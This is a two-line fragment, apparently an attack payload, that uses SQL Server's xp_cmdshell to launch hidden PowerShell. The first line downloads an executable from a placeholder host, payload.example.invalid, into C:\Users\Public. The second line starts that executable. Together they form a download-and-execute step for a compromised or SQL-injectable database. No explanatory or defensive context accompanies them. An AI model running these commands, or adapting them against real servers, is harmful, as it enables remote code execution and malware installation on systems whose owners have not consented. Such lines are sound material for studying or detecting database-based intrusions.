        
        EXEC xp_cmdshell 'powershell -nop -w hidden -c "$w=new-object net.webclient;$w.Proxy=$null;$w.DownloadFile(''http://payload.example.invalid/down.exe'',''C:\Users\Public\down.exe'')"';
        
        EXEC xp_cmdshell 'powershell -nop -w hidden -c "Start-Process -FilePath C:\Users\Public\down.exe -WindowStyle Normal"';
